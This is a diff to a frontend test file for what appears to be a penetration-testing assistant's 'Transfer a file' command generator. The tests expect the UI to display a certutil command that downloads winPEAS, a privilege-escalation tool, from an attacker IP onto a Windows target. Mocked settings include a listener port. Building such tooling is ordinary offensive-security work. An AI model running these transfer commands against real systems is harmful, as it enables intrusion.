@@ -12,6 +12,7 @@ import type { LogEntryInput } from "../types/log";
 import { usePaletteStore } from "../features/palette/usePaletteStore";
 import { useLastEngagementStore } from "../features/arsenal/useFillScope";
 import { api } from "../lib/api";
+import { commandText } from "./support/commandText";
 import { makeQueryClient } from "../lib/queryClient";
 import type { Engagement } from "../types/engagement";
 import type { Host } from "../types/host";
@@ -55,6 +56,8 @@ const mount = (path: string, engagement = E1) => {
 beforeEach(() => {
   localStorage.clear();
   vi.resetAllMocks();
+  m.hostIdentityGet.mockResolvedValue(null);
+  m.vectorsList.mockResolvedValue([]);
   useCaptureStore.getState().reset();
   usePaletteStore.getState().close();
   useLastEngagementStore.setState({ engagementId: "e1", hostId: "ms02" });
@@ -64,7 +67,7 @@ beforeEach(() => {
   m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
   m.settingsGet.mockResolvedValue({
     autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "10.10.14.9", listenerPort: "4444", kaliUser: "kali",
-    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm",
+    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false,
   });
   m.engagementsProgress.mockResolvedValue({});
   m.hostsList.mockResolvedValue([MS02]);
@@ -109,13 +112,13 @@ describe("Transfer a file", () => {
     // Another method is another tab; the serve command stays.
     await user.click(g.getByRole("tab", { name: "HTTP · certutil" }));
     expect(await pre(g, "certutil -urlcache -split -f http://10.10.14.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
-    expect(g.getByText("cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
+    expect(g.getByText(commandText("cd ~/tools/windows && python3 -m http.server 80"))).toBeInTheDocument();
   });
 
   it("the Kali half serves from the tool folders set in Settings", async () => {
     m.settingsGet.mockResolvedValue({
       autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "10.10.14.9", listenerPort: "4444", kaliUser: "kali",
-      windowsToolsDir: "/opt/win tools", linuxToolsDir: "/opt/lin", fieldManualPath: "~/fm",
+      windowsToolsDir: "/opt/win tools", linuxToolsDir: "/opt/lin", fieldManualPath: "~/fm", nvdKeySet: false,
     });
     const user = userEvent.setup();
     mount("/arsenal?generator=transfer");
@@ -168,7 +171,7 @@ describe("Transfer a file", () => {
   it("the palette opens the generator in Arsenal", async () => {
     const user = userEvent.setup();
     mount("/e/e1/h/ms02");
-    await screen.findByRole("tab", { name: "Checklist" });
+    await screen.findByRole("tab", { name: "Next" });
     await user.keyboard("{Meta>}k{/Meta}");
     await user.type(await screen.findByRole("combobox", { name: "Search" }), "transfer a file");
     const opt = await screen.findByRole("option", { name: "Transfer a file" });
